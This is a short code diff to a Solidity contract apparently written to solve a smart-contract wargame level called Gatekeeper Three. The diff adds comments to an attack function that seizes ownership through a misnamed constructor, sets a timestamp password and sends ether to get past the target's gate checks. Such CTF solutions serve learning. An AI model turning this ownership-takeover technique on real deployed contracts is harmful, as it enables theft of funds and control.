@@ -11,11 +11,14 @@ contract GatekeeperThreeAttack {
     }
     
     function attack() public {
+        // Take ownership
         gatekeeperThree.construct0r();
+        // Set pasword block.timmestamp
         gatekeeperThree.createTrick();
+        // Set allow_entrance = true
         gatekeeperThree.getAllowance(block.timestamp);
-        (bool sent, ) = payable(address(gatekeeperThree)).call{value: 1000000000000001 wei}("");
-        require(sent, "Failed to send Ether");        
+        // Enter
+        payable(address(gatekeeperThree)).transfer(0.0011 ether);     
         gatekeeperThree.enter();
     }
 }
